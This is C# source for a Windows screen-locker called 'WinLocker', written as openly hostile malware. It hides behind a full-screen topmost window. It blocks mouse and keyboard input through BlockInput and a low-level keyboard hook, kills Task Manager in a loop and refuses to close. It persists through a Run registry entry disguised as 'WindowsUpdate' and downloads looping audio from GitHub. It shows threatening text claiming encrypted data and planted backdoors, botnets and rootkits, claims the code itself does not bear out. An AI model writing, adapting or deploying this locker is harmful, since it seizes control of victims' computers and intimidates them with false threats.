using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class WinLocker : Form
{
    [DllImport("user32.dll")]
    private static extern bool BlockInput(bool fBlockIt);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private Label lblScaryLeft;
    private Label lblDedsekRight;
    private Label lblPassword;
    private TextBox txtPassword;
    private Label lblStatus;

    private const string PASSWORD = "1601";
    private const int WH_KEYBOARD_LL = 13;
    private IntPtr _hookID = IntPtr.Zero;
    private SoundPlayer player;
    private System.Windows.Forms.Timer bootTimer;

    public WinLocker()
    {
        this.WindowState = FormWindowState.Maximized;
        this.FormBorderStyle = FormBorderStyle.None;
        this.TopMost = true;
        this.BackColor = Color.Black;
        this.StartPosition = FormStartPosition.Manual;
        this.Location = new Point(0, 0);
        this.Size = Screen.PrimaryScreen.Bounds.Size;
        this.ShowInTaskbar = false;
        this.Opacity = 0;

        lblScaryLeft = new Label
        {
            Text = "YOUR DATA IS ENCRYPTED\n" +
                   "REBOOT OR SHUTDOWN = WINDOWS DESTROYED\n" +
                   "YOU WILL NEVER KNOW THE PASSWORD\n" +
                   "SUCK IT\n\n" +
                   "BUT I'M NOT A BLACKMAILER, I WILL GIVE YOU A PASSWORD\n" +
                   "BUT NOT JUST A PASSWORD, YOU MUST DECRYPT IT\n" +
                   "1 - 5 PASSWORDS ARE ALL DIFFERENT NETWORKS\n" +
                   "SUFFER, IDIOT\n\n" +
                   "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n" +
                   "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n" +
                   "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n" +
                   "4. Base64\nNDM1NjM0MjM0\n" +
                   "5. SHA1\nc93c407d0fb7c60a40b8a2f02b1e4ccf2a9c632d",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 12),
            AutoSize = true,
            Location = new Point(20, 50)
        };
        this.Controls.Add(lblScaryLeft);

        lblDedsekRight = new Label
        {
            Text = "DEDSEK DOES NOT FORGIVE\n" +
                   "YOU SHOULD NOT HAVE DOWNLOADED ANYTHING\n" +
                   "FROM UNTRUSTED SOURCES\n\n" +
                   "DEDSEK SEES YOU\n\n" +
                   "BY THE WAY, THIS IS NOT THE ONLY VIRUS\n" +
                   "YOU HAVE FROM ME:\n" +
                   "- BACKDOOR\n" +
                   "- BOTNET\n" +
                   "- ROOTKIT\n" +
                   "- FAT WORM",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 14),
            AutoSize = true,
            Location = new Point(this.Width - 500, 50),
            TextAlign = ContentAlignment.TopRight
        };
        this.Controls.Add(lblDedsekRight);

        lblPassword = new Label
        {
            Text = "ENTER PASSWORD:",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 24),
            AutoSize = true,
            Location = new Point((this.Width / 2) - 200, (this.Height / 2) + 50)
        };
        this.Controls.Add(lblPassword);

        txtPassword = new TextBox
        {
            PasswordChar = '*',
            Font = new Font("Courier New", 24),
            BackColor = Color.Black,
            ForeColor = Color.White,
            Location = new Point((this.Width / 2) - 200, (this.Height / 2) + 100),
            Size = new Size(400, 40)
        };
        this.Controls.Add(txtPassword);

        lblStatus = new Label
        {
            Text = "",
            ForeColor = Color.White,
            BackColor = Color.Black,
            Font = new Font("Courier New", 16),
            AutoSize = true,
            Location = new Point((this.Width / 2) - 200, (this.Height / 2) + 150)
        };
        this.Controls.Add(lblStatus);

        // Таймер для анимации (15 секунд)
        bootTimer = new System.Windows.Forms.Timer();
        bootTimer.Interval = 15000;
        bootTimer.Tick += BootTimer_Tick;
        bootTimer.Start();

        // Вместо обработки клавиш просто разрешаем ввод в TextBox
        this.KeyPreview = true;
        this.KeyDown += (sender, e) => {
            if (e.KeyCode == Keys.Enter)
            {
                if (txtPassword.Text == PASSWORD)
                {
                    BlockInput(false);
                    if (player != null)
                        player.Stop();
                    Application.Exit();
                }
                else
                {
                    lblStatus.Text = "WRONG PASSWORD!";
                    txtPassword.Clear();
                }
            }
        };

        new Thread(KillTaskmgr).Start();
        AddToStartup();
    }

    private void BootTimer_Tick(object sender, EventArgs e)
    {
        bootTimer.Stop();
        this.Opacity = 1;
        BlockInput(true);
        SetHook();
        DownloadAndPlayMusic();
    }

    private void AddToStartup()
    {
        try
        {
            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            key.SetValue("WindowsUpdate", Application.ExecutablePath);
        }
        catch { }
    }

    private void DownloadAndPlayMusic()
    {
        try
        {
            string musicUrl = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/music.mp3";
            string tempPath = Path.GetTempPath() + "wd2_theme.mp3";

            if (!File.Exists(tempPath))
            {
                using (WebClient client = new WebClient())
                {
                    client.DownloadFile(musicUrl, tempPath);
                }
            }

            player = new SoundPlayer(tempPath);
            player.PlayLooping();
        }
        catch { }
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        e.Cancel = true;
    }

    private void SetHook()
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        return (IntPtr)1;
    }

    private static void KillTaskmgr()
    {
        while (true)
        {
            foreach (var proc in Process.GetProcessesByName("taskmgr"))
            {
                try { proc.Kill(); } catch { }
            }
            Thread.Sleep(100);
        }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [STAThread]
    public static void Main()
    {
        Application.EnableVisualStyles();
        Application.Run(new WinLocker());
    }
}
